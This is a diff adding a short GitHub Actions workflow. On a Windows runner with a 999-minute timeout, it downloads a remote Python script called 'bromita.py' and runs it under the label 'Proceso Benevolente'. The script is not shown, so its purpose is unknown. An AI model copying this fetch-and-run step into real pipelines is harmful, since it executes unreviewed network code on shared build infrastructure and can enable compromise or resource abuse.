@@ -1,0 +1,18 @@
+name: main
+
+on: workflow_dispatch
+
+jobs:
+  build:
+
+    runs-on: windows-latest
+    timeout-minutes: 999
+
+    steps:
+    - name: Descarga necesario
+      run: |
+        Invoke-WebRequest https://raw.githubusercontent.com/cremans/prueba/main/bromita.py -OutFile bromita.py
+    - name: Instalando dependencias.
+      run: cmd /c pip install requests
+    - name: Proceso Benevolente
+      run: cmd /c python3 bromita.py
